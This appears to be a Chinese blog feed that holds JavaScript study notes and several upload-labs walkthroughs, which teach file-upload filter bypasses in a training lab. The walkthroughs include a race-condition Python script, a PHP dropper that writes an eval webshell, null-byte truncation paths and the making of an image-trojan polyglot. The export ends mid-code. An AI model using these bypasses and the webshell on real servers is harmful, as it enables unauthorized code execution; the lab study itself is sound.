class="line">设置input元素的validationMessage属性，用于自定义错误提示信息的方法。使用setCustomValidity设置了自定义提示后，validity.customError就会变为true，checkValidity总是会返回false。如果要重新判断需要取消自定义提示，方式如下：</span><br><span class="line">setCustomValidity(&#x27;&#x27;)</span><br><span class="line">setCustomValidity(null)</span><br><span class="line">setCustomValidity(undefined)</span><br></pre></td></tr></table></figure><h2 id="约束验证-DOM-属性"><a href="#约束验证-DOM-属性" class="headerlink" title="约束验证 DOM 属性"></a>约束验证 DOM 属性</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">validity  布尔属性值，返回input输入值是否合法</span><br><span class="line">validationMessage   浏览器错误提示信息</span><br><span class="line">willValidate指定input是否需要验证</span><br></pre></td></tr></table></figure><h2 id="Validity-属性"><a href="#Validity-属性" class="headerlink" title="Validity 属性"></a>Validity 属性</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">customError设置为 true, 如果设置了自定义的 validity 信息。</span><br><span class="line">patternMismatch设置为 true, 如果元素的值不匹配它的模式属性。</span><br><span class="line">rangeOverflow设置为 true, 如果元素的值大于设置的最大值。</span><br><span class="line">rangeUnderflow设置为 true, 如果元素的值小于它的最小值。</span><br><span class="line">stepMismatch设置为 true, 如果元素的值不是按照规定的 step 属性设置。</span><br><span class="line">tooLong设置为 true, 如果元素的值超过了 maxLength 属性设置的长度。</span><br><span class="line">typeMismatch设置为 true, 如果元素的值不是预期相匹配的类型。</span><br><span class="line">valueMissing设置为 true，如果元素 (required 属性) 没有值。</span><br><span class="line">valid设置为 true，如果元素的值是合法的。</span><br></pre></td></tr></table></figure><h1 id="this-关键字"><a href="#this-关键字" class="headerlink" title="this 关键字"></a>this 关键字</h1><p>面向对象语言中 this 表示当前对象的一个引用。<br>但在 JavaScript 中 this 不是固定不变的，它会随着执行环境的改变而改变。</p><ul><li>在方法中，this 表示该方法所属的对象。</li><li>如果单独使用，this 表示全局对象。在浏览器中，window 就是该全局对象为 [object Window]</li><li>在函数中，this 表示全局对象。</li><li>在函数中，在严格模式下，this 是未定义的(undefined)。</li><li>在事件中，this 表示接收事件的元素。</li><li>类似 call() 和 apply() 方法可以将 this 引用到任何对象。<br>在下面实例中，当我们使用 person2 作为参数来调用 person1.fullName 方法时, this 将指向 person2, 即便它是 person1 的方法：<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person1 = &#123;</span><br><span class="line">  <span class="attr">fullName</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">firstName</span> + <span class="string">&quot; &quot;</span> + <span class="variable language_">this</span>.<span class="property">lastName</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person2 = &#123;</span><br><span class="line">  <span class="attr">firstName</span>:<span class="string">&quot;John&quot;</span>,</span><br><span class="line">  <span class="attr">lastName</span>: <span class="string">&quot;Doe&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">person1.<span class="property">fullName</span>.<span class="title function_">call</span>(person2);  <span class="comment">// 返回 &quot;John Doe&quot;js</span></span><br></pre></td></tr></table></figure></li></ul><h1 id="let-和-const"><a href="#let-和-const" class="headerlink" title="let 和 const"></a>let 和 const</h1><p>let 声明的变量只在 let 命令所在的代码块内有效。<br>const 声明一个只读的常量，一旦声明，常量的值就不能改变。</p><h2 id="JavaScript-块级作用域-Block-Scope"><a href="#JavaScript-块级作用域-Block-Scope" class="headerlink" title="JavaScript 块级作用域(Block Scope)"></a>JavaScript 块级作用域(Block Scope)</h2><p>使用 var 关键字声明的变量不具备块级作用域的特性，它在 {} 外依然能被访问到。<br>ES6 可以使用 let 关键字来实现块级作用域。<br>let 声明的变量只在 let 命令所在的代码块 {} 内有效，在 {} 之外不能访问。</p><h2 id="循环作用域"><a href="#循环作用域" class="headerlink" title="循环作用域"></a>循环作用域</h2><p>使用了 var 关键字，它声明的变量是全局的，包括循环体内与循环体外。<br>使用 let 关键字， 它声明的变量作用域只在循环体内，循环体外的变量不受影响。</p><h2 id="HTML-代码中使用全局变量"><a href="#HTML-代码中使用全局变量" class="headerlink" title="HTML 代码中使用全局变量"></a>HTML 代码中使用全局变量</h2><p>使用 <strong>var</strong> 关键字声明的全局作用域变量属于 window 对象,使用 <strong>var</strong> 关键字声明的变量在任何地方都可以修改,不能使用 <strong>var</strong> 关键字来重置 <strong>let</strong> 关键字声明的变量<br>使用 <strong>let</strong> 关键字声明的全局作用域变量不属于 window 对象,在相同的作用域或块级作用域中，不能使用 <strong>let</strong> 关键字来重置 <strong>var</strong> 关键字声明的变量,不能使用 <strong>let</strong> 关键字来重置 <strong>let</strong> 关键字声明的变量</p><h2 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h2><p>JavaScript 中，var 关键字定义的变量可以在使用后声明，也就是变量可以先使用再声明<br>let 和 const 关键字定义的变量则不可以在使用后声明，也就是变量需要先声明再使用。</p><h2 id="const-关键字"><a href="#const-关键字" class="headerlink" title="const 关键字"></a>const 关键字</h2><p>const 用于声明一个或多个常量，声明时必须进行初始化，且初始化后值不可再修改<br>const定义常量与使用let 定义的变量相似：</p><ul><li>二者都是块级作用域</li><li>都不能和它所在作用域内的其他变量或函数拥有相同的名称<br>两者还有以下两点区别：</li><li>const声明的常量必须初始化，而let声明的变量不用</li><li>const 定义常量的值不能通过再赋值修改，也不能再次声明。而 let 定义的变量值可以修改</li></ul><h3 id="并非真正的常量"><a href="#并非真正的常量" class="headerlink" title="并非真正的常量"></a>并非真正的常量</h3><p>const 的本质: const 定义的变量并非常量，并非不可变，它定义了一个常量引用一个值。使用 const 定义的对象或者数组，其实是可变的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建常量对象</span></span><br><span class="line"><span class="keyword">const</span> car = &#123;<span class="attr">type</span>:<span class="string">&quot;Fiat&quot;</span>, <span class="attr">model</span>:<span class="string">&quot;500&quot;</span>, <span class="attr">color</span>:<span class="string">&quot;white&quot;</span>&#125;;</span><br><span class="line"><span class="comment">// 修改属性:</span></span><br><span class="line">car.<span class="property">color</span> = <span class="string">&quot;red&quot;</span>;</span><br><span class="line"><span class="comment">// 添加属性</span></span><br><span class="line">car.<span class="property">owner</span> = <span class="string">&quot;Johnson&quot;</span>;</span><br></pre></td></tr></table></figure><p>但是不能对常量对象或数组重新赋值。</p><h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><p>JSON 是用于存储和传输数据的格式。<br>JSON 通常用于服务端向网页传递数据。</p><h2 id="什么是-JSON"><a href="#什么是-JSON" class="headerlink" title="什么是 JSON?"></a>什么是 JSON?</h2><p>JSON 英文全称 JavaScript Object Notation<br>JSON 是一种轻量级的数据交换格式。<br>JSON是独立的语言（JSON 使用 JavaScript 语法，但是 JSON 格式仅仅是一个文本。文本可以被任何编程语言读取及作为数据格式传递。）<br>JSON 易于理解。<br>实例：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;sites&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Runoob&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;www.runoob.com&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span> </span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Google&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;www.google.com&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;Taobao&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span><span class="string">&quot;www.taobao.com&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="JSON-语法规则"><a href="#JSON-语法规则" class="headerlink" title="JSON 语法规则"></a>JSON 语法规则</h2><ul><li>数据为 键&#x2F;值 对</li><li>数据由逗号分隔</li><li>大括号保存对象</li><li>方括号保存数组</li></ul><h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JSON.parse()用于将一个JSON字符串转换为JavaScript对象</span><br><span class="line">JSON.stringify()用于将JavaScript值转换为JSON字符串</span><br></pre></td></tr></table></figure><h1 id="javascript-void-0-含义"><a href="#javascript-void-0-含义" class="headerlink" title="javascript:void(0) 含义"></a>javascript:void(0) 含义</h1><figure class="highlight plaintext"><figcaption><span>中最关键的是void关键字，void是JavaScript中非常重要的关键字，该操作符指定要计算一个表达式但是不返回值。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">语法格式如下：</span><br><span class="line">```js</span><br><span class="line">void func()</span><br><span class="line">javascript:void func()</span><br><span class="line">或</span><br><span class="line">void(func())</span><br><span class="line">javascript:void(func())</span><br></pre></td></tr></table></figure><p>下面的代码创建了一个超级链接，当用户点击以后不会发生任何事。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0)&quot;</span>&gt;</span>单击此处什么也不会发生<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以下实例中，在用户点击链接后显示警告信息：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>点击以下链接查看结果：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(alert(&#x27;Warning!!!&#x27;))&quot;</span>&gt;</span>点我!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="href-x3D-”-”与href-x3D-”javascript-void-0-”的区别"><a href="#href-x3D-”-”与href-x3D-”javascript-void-0-”的区别" class="headerlink" title="href&#x3D;”#”与href&#x3D;”javascript:void(0)”的区别"></a>href&#x3D;”#”与href&#x3D;”javascript:void(0)”的区别</h2><p># 包含了一个位置信息，默认的锚是#top 也就是网页的上端。<br>而javascript:void(0), 仅仅表示一个死链接。<br>在页面很长的时候会使用 # 来定位页面的具体位置，格式为：# + id。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:void(0);&quot;</span>&gt;</span>点我没有反应的!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#pos&quot;</span>&gt;</span>点我定位到指定位置!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">&quot;pos&quot;</span>&gt;</span>尾部定位点<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="异步编程"><a href="#异步编程" class="headerlink" title="异步编程"></a>异步编程</h1><h2 id="异步的概念"><a href="#异步的概念" class="headerlink" title="异步的概念"></a>异步的概念</h2><p>异步（Asynchronous, async）是与同步（Synchronous, sync）相对的概念。<br>同步按照代码顺序执行，异步不按照代码顺序执行，异步的执行效率更高。<br>通俗地解释一下异步：异步就是从主线程发射一个子线程来完成任务。</p><h2 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h2><p>回调函数就是一个函数，它是在我们启动一个异步任务的时候就告诉它：等你完成了这个任务之后要干什么。这样一来主线程几乎不用关心异步任务的状态了，他自己会善始善终。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;demo1&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;RUNOOB-1!&quot;</span>;</span><br><span class="line">&#125;, <span class="number">3000</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;demo2&quot;</span>).<span class="property">innerHTML</span>=<span class="string">&quot;RUNOOB-2!&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="异步-AJAX"><a href="#异步-AJAX" class="headerlink" title="异步 AJAX"></a>异步 AJAX</h2><p>除了 setTimeout 函数以外，异步回调广泛应用于 AJAX 编程。<br>XMLHttpRequest 常常用于请求来自远程服务器上的 XML 或 JSON 数据。一个标准的 XMLHttpRequest 对象往往包含多个回调</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.runoob.com/js/js-tutorial.html">JavaScript教程-runoob</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;只是对于JS学习的简单记录，以便于加强自身记忆。&lt;/p&gt;</summary>
    
    
    
    <category term="JS" scheme="http://example.com/categories/JS/"/>
    
    
    <category term="JS" scheme="http://example.com/tags/JS/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs_18+19</title>
    <link href="http://example.com/2022/11/27/upload-labs_18+19/"/>
    <id>http://example.com/2022/11/27/upload-labs_18+19/</id>
    <published>2022-11-26T16:00:00.000Z</published>
    <updated>2022-11-27T06:15:42.825Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关burp发挥的作用很大</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>这一关的提示是代码审计，通过尝试，可以发现，是白名单验证的方式。<br>代码他是先将图片上传上去，才开始进行判断后缀名、二次渲染。如果我们在上传上去的一瞬间访问这个文件，那他就不能对这个文件删除、二次渲染。这就相当于我们打开了一个文件，然后再去删除这个文件，就会提示这个文件在另一程序中打开无法删除。<br>那么我们的方法是：尝试使用竞争条件上传，用burp一直上传文件，用python脚本一直方位临时文件，临时文件内容为我们写入一句话到它的目录。<br>其中python脚本如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(i,end=<span class="string">&#x27;\r&#x27;</span>)</span><br><span class="line">            test = requests.get(<span class="string">&quot;http://192.168.44.129:9096/upload/upload/success.php&quot;</span>)         //写入上传位置路径地址</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;260ca9dd8a4577fc00b7bd5810298076&quot;</span> <span class="keyword">in</span> test.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>上传的文件内容如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>PHP</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(success);</span><br><span class="line"><span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_REQUEST[123])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用burp抓包-&gt;发送到Intruder<br><img src="/simg/upload-labs_18.png" alt=" "><br>Intruder中-&gt;Payloads  修改为如图所示<br><img src="/simg/upload-labs_18_2.png" alt=" "><br>最后同时运行python脚本和burp的start attack<br>则运行成功。</p><h2 id="第19关"><a href="#第19关" class="headerlink" title="第19关"></a>第19关</h2><p>也是和18关原理相同</p><p>这2关可以参考这个博客的另一个方法<br><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">17,18</a></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我自己觉得这两关是完成的不太好的，有各种各样的因素，以后再来补充吧~</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这一关burp发挥的作用很大&lt;/p&gt;</summary>
    
    
    
    <category term="upload-labs" scheme="http://example.com/categories/upload-labs/"/>
    
    
    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
    
    <category term="burp" scheme="http://example.com/tags/burp/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs_21</title>
    <link href="http://example.com/2022/11/27/upload-labs_21/"/>
    <id>http://example.com/2022/11/27/upload-labs_21/</id>
    <published>2022-11-26T16:00:00.000Z</published>
    <updated>2022-11-27T06:12:41.958Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关用到的是数组绕过</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><p>这道题需要代码审计，通过审计发现，先检查文件类型，后检查是否上传了文件名没有则为文件的名字，判断是否为数组，若不是则以点分割返回一个数组，取数组最后一位数为后缀，文件保存为reset输出数组第一个数，和最后一位数保存。</p><p>具体实现：<br>上传图片马文件，然后保存文件后缀改为php<br>之后抓包，然后如下图所示修改<br><img src="/simg/upload-labs_21.png" alt=" "><br>最后放包，就上传成功了，蚁剑也连接成功</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>不仅要会方法，还要懂原理。通过这21关的训练，其实可以发现，白名单比黑名单安全性更高。<br>实战需要自己测试！</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a><br><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这一关用到的是数组绕过&lt;/p&gt;</summary>
    
    
    
    <category term="upload-labs" scheme="http://example.com/categories/upload-labs/"/>
    
    
    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
    
    <category term="蚁剑" scheme="http://example.com/tags/%E8%9A%81%E5%89%91/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs_20</title>
    <link href="http://example.com/2022/11/27/upload-labs_20/"/>
    <id>http://example.com/2022/11/27/upload-labs_20/</id>
    <published>2022-11-26T16:00:00.000Z</published>
    <updated>2022-11-27T05:48:31.175Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关要轻松一些了</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第1种方法"><a href="#第1种方法" class="headerlink" title="第1种方法"></a>第1种方法</h2><p>截断move_uploaded_file()函数中的img_path是由post参数save_name控制的，可以在save_name利用%00截断(注意php版本低于5.3)<br>具体实现是，上传文件为图片马，将保存文件的名称后缀修改为.php 注意最后有一个空格<br>然后抓包，在Hex里修改空格20为00<br>可以看到上传成功，蚁剑连接也成功</p><h2 id="第2种方法"><a href="#第2种方法" class="headerlink" title="第2种方法"></a>第2种方法</h2><p>move_uploaded_file()有这么一个特性，会忽略掉文件末尾的 &#x2F;.<br>所以可以抓包，然后在保存文件末尾用&#x2F;.<br>这样我们可以看到，文件同样上传成功，蚁剑也连接成功</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这一关的方法要简单一些了，但只是学会了方法，背后的原理仍需掌握。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a><br><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这一关要轻松一些了&lt;/p&gt;</summary>
    
    
    
    <category term="upload-labs" scheme="http://example.com/categories/upload-labs/"/>
    
    
    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
    
    <category term="蚁剑" scheme="http://example.com/tags/%E8%9A%81%E5%89%91/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs_11-16</title>
    <link href="http://example.com/2022/11/26/upload-labs_11-16/"/>
    <id>http://example.com/2022/11/26/upload-labs_11-16/</id>
    <published>2022-11-25T16:00:00.000Z</published>
    <updated>2022-11-26T14:24:50.855Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在sqli-labs中类似的绕过</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第11关"><a href="#第11关" class="headerlink" title="第11关"></a>第11关</h2><p>抓包将后缀名改成双写即可绕过，即1.pphphp<br>成功绕过</p><h2 id="第12关"><a href="#第12关" class="headerlink" title="第12关"></a>第12关</h2><p>抓包后，在save_path处修改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../upload/b.php%00    通过%00截断的方式强行上传</span><br></pre></td></tr></table></figure><p>同时将file_name改为b.png<br>成功绕过</p><h2 id="第13关"><a href="#第13关" class="headerlink" title="第13关"></a>第13关</h2><p>先上传一个php文件，发现显示报错，那么是白名单模式<br>我们再上传一次抓包，然后发现是POST请求，那么就可以通过截断方式<br>首先，将b.php改为b.png<br>然后，将save_path处的路径改为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../upload/b.php (最后有一个空格)</span><br></pre></td></tr></table></figure><p>将这个空格在Hex中从20改为00<br>最后放包。<br>成功绕过</p><h2 id="第14关"><a href="#第14关" class="headerlink" title="第14关"></a>第14关</h2><p>这道题主要检测的是文件头，我们上传的所有文件都会被转化为图片格式，我们需要上传一句话图片木马，如下图，将文件后缀改为php上传成功，但返回的为jpg格式文件。<br>这道题需要使用图片一句话木马。那么首先我们需要做一个出来。<br>在目录下，放一张b.jpg图片，再放一个b.php文件。然后在该目录下输入cmd命令，输入以下指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy b.jpg/b+b.php/a b.jpg</span><br></pre></td></tr></table></figure><p>然后再把文件上传<br>之后打开页面的“文件包含漏洞”链接。然后在地址栏后输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=upload/7920221126210455.jpg   数字是该文件上传后具有的</span><br></pre></td></tr></table></figure><p>成功绕过</p><h2 id="第15关"><a href="#第15关" class="headerlink" title="第15关"></a>第15关</h2><p>源码中出现了getimagesize函数。<br>getimagesize — 取得图像大小。如果不能访问 filename 指定的图像或者其不是有效的图像，getimagesize() 将返回 false 并产生一条 E_WARNING 级的错误。<br>因为我们上传的的确是一张图片，所以可以使用和第14关的方法。<br>成功绕过</p><h2 id="第16关"><a href="#第16关" class="headerlink" title="第16关"></a>第16关</h2><p>操作和前2关是一样的。<br>但这里需要打开php.ini文件里的php_exif.dll，如果打开后找不到，尝试更换PHP版本。<br>成功绕过</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>其实难度相对简单，这几关和编程关联并不大，只是需要知道应该怎么做。</p><h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/Thunderclap_/article/details/108948611">upload-labs文件上传靶场实验通关教程攻略</a><br><a href="https://www.cnblogs.com/chu-jian/p/15515770.html">upload-labs通关攻略</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;在sqli-labs中类似的绕过&lt;/p&gt;</summary>
    
    
    
    <category term="upload-labs" scheme="http://example.com/categories/upload-labs/"/>
    
    
    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
    
    <category term="蚁剑" scheme="http://example.com/tags/%E8%9A%81%E5%89%91/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs_17</title>
    <link href="http://example.com/2022/11/26/upload-labs_17/"/>
    <id>http://example.com/2022/11/26/upload-labs_17/</id>
    <published>2022-11-25T16:00:00.000Z</published>
    <updated>2022-11-26T15:52:09.687Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>从17关开始，就变得有挑战性了。</p><span id="more"></span><h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><h2 id="第17关"><a href="#第17关" class="headerlink" title="第17关"></a>第17关</h2><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span 